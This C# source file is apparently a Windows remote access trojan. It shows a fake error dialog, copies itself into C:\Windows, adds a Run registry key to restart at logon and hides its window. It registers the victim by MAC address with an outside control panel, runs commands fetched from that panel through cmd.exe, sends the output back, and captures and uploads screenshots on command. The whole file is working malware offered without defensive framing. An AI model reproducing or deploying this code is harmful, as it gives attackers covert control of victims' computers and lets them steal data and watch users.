using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Management;
using System.Net.NetworkInformation;
using Microsoft.Win32;
using System.Net;
using System.IO;
using System.Threading;
using System.Diagnostics;
using System.Text.RegularExpressions;
using System.Runtime.InteropServices;
using System.Drawing.Imaging;
using System.Drawing;
using System.Text;
using System.Net.Http;

namespace pay2
{
    static class Program
    {

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        [STAThread]
        static void Main()
        {
            MessageBox.Show("Error 0x0000000");
            string sourcefile = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
            string destinationFile = "C:\\Windows\\systemx.exe";
            try
            {
                File.Copy(sourcefile, destinationFile, true);
                Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                key.SetValue("systemx", destinationFile);
            }
            catch
            {
            }
            var handle = GetConsoleWindow();

            ShowWindow(handle, SW_HIDE);
            var macAddr =
    (
        from nic in NetworkInterface.GetAllNetworkInterfaces()
        where nic.OperationalStatus == OperationalStatus.Up
        select nic.GetPhysicalAddress().ToString()
    ).FirstOrDefault();
            SystemInfo si = new SystemInfo();
            si.getOperatingSystemInfo();
            string sURL;
            sURL = "https://asimplepanel.000webhostapp.com/create_data.php?id=" + macAddr;
            WebRequest wrGETURL;
            wrGETURL = WebRequest.Create(sURL);
            Stream objStream;
            objStream = wrGETURL.GetResponse().GetResponseStream();
            while (true)
            {
                string sURL2;
                sURL2 = "https://asimplepanel.000webhostapp.com/list/" + macAddr;
                WebRequest wrGETURL2;
                wrGETURL2 = WebRequest.Create(sURL2);
                Stream objStream2;
                objStream2 = wrGETURL2.GetResponse().GetResponseStream();
                Thread.Sleep(3000);
                StreamReader objReader2 = new StreamReader(objStream2);
                string sLine = "";
                int i = 0;
                String output;
                output = "";
                while (sLine != null)
                {
                    i++;
                    sLine = objReader2.ReadLine();
                    if (sLine != null)
                        output = output + sLine;
                }
                int olenght = output.Length;
                if (olenght > 0)
                {
                    if (output.Substring(0, 1) == "!")
                    {
                        output = output.Remove(0, 1);
                        Process p = new Process();
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.FileName = "cmd.exe";
                        p.StartInfo.Arguments = "/C " + output;
                        p.Start();
                        string o = p.StandardOutput.ReadToEnd();
                        p.WaitForExit();
                        if (o.Length > 1000)
                        {

                            var split = o.Select((c, index) => new { c, index })
                                .GroupBy(x => x.index / 1000)
                                .Select(group => group.Select(elem => elem.c))
                                .Select(chars => new string(chars.ToArray()));
                            foreach (string curl in split)
                            {
                                WebRequest wrGETURL3;
                                wrGETURL3 = WebRequest.Create("https://asimplepanel.000webhostapp.com/recive_data.php?id=" + macAddr + "&recv=" + curl);
                                Stream objStream3;
                                objStream3 = wrGETURL3.GetResponse().GetResponseStream();
                            }
                        }
                        else
                        {
                            WebRequest wrGETURL3;
                            wrGETURL3 = WebRequest.Create("https://asimplepanel.000webhostapp.com/recive_data.php?id=" + macAddr + "&recv=" + o);
                            Stream objStream3;
                            objStream3 = wrGETURL3.GetResponse().GetResponseStream();
                        }


                    }
                    if (output == "screenshot")
                    {
                        WebClient cl = new WebClient();
                        try
                        {
                            Bitmap captureBitmap = new Bitmap(1024, 768, PixelFormat.Format32bppArgb);
                            Rectangle captureRectangle = Screen.AllScreens[0].Bounds;
                            Graphics captureGraphics = Graphics.FromImage(captureBitmap);
                            captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);
                            captureBitmap.Save("C:\\Windows\\Capture.jpg", ImageFormat.Jpeg);
                            cl.UploadFile("http://asimplepanel.000webhostapp.com/recvimg.php", "Capture.jpg");
                        }
                        catch (Exception e)
                        {
                            MessageBox.Show("Upload failed");
                        }
                    }
                }
            }
        }



    }
    public class SystemInfo
    {
        public void getOperatingSystemInfo()
        {
            var macAddr =
    (
        from nic in NetworkInterface.GetAllNetworkInterfaces()
        where nic.OperationalStatus == OperationalStatus.Up
        select nic.GetPhysicalAddress().ToString()
    ).FirstOrDefault();
            ManagementObjectSearcher mos = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
            foreach (ManagementObject managementObject in mos.Get())
            {
                if (managementObject["Caption"] != null)
                {
                    string dosc;
                    dosc = ("Operating System Name  :  " + managementObject["Caption"].ToString());   //Display operating system caption
                    WebRequest wrGETURL;
                    wrGETURL = WebRequest.Create("https://asimplepanel.000webhostapp.com/recive_data.php?id=" + macAddr + "&recv=" + dosc);
                    Stream objStream;
                    objStream = wrGETURL.GetResponse().GetResponseStream();
                }
                if (managementObject["OSArchitecture"] != null)
                {
                    string dosa;
                    dosa = ("Operating System Architecture  :  " + managementObject["OSArchitecture"].ToString());   //Display operating system architecture.
                    WebRequest wrGETURL;
                    wrGETURL = WebRequest.Create("https://asimplepanel.000webhostapp.com/recive_data.php?id=" + macAddr + "&recv=" + dosa);
                    Stream objStream;
                    objStream = wrGETURL.GetResponse().GetResponseStream();
                }
                if (managementObject["CSDVersion"] != null)
                {
                    string dosv;
                    dosv = ("Operating System Service Pack   :  " + managementObject["CSDVersion"].ToString());     //Display operating system version.
                    WebRequest wrGETURL;
                    wrGETURL = WebRequest.Create("https://asimplepanel.000webhostapp.com/recive_data.php?id=" + macAddr + "&recv=" + dosv);
                    Stream objStream;
                    objStream = wrGETURL.GetResponse().GetResponseStream();
                }

            }
        }

    }

}